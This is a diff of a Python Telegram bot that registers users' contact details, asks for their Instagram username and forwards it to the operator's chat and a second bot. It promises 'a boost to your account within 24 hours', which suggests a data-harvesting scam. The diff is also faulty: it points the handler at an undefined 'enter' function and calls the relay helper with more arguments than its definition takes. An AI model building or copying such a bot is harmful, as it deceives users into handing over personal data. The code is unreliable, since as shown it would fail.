@@ -144,19 +144,7 @@ def contact(message):
 		bot.send_message(message.chat.id, 'Registration Completed Successfully!') 
 		time.sleep(1)
 		msg = bot.send_message(message.chat.id, 'Enter Your Instagram Username:') 
-		bot.register_next_step_handler(msg, entr)
-
-def entr(message):
-	try:
-		inp = message.text
-		m_id = message.chat.id
-
-		bot.reply_to(message, f'Instagram Username: {inp} ')#⏳
-		bot.send_message(ID, f'User Instagram Username: {inp}')
-		bot.send_message(message.chat.id, 'Expect a boost to your account within 24 hours!')
-	except Exception as e:
-		bot.send_message(ID, e)
-		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
+		bot.register_next_step_handler(msg, enter)
 
 def send_info_to_second_bot(info):
     # Replace "YOUR_SECOND_BOT_TOKEN" and "YOUR_SECOND_BOT_CHAT_ID" with the actual values
@@ -180,6 +168,20 @@ def send_info_to_second_bot(info):
     if response.status_code != 200:
         print(f"Failed to send message to the second bot: {response.status_code}")
 
+info_message = "This is a test message."
+send_info_to_second_bot(info_message, SECOND_BOT_TOKEN, SECOND_BOT_CHAT_ID)
+
+def entr(message):
+	try:
+		inp = message.text
+		m_id = message.chat.id
+
+		bot.reply_to(message, f'Instagram Username: {inp} ')#⏳
+		bot.send_message(ID, f'User Instagram Username: {inp}')
+		bot.send_message(message.chat.id, 'Expect a boost to your account within 24 hours!')
+	except Exception as e:
+		bot.send_message(ID, e)
+		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
 
 
 
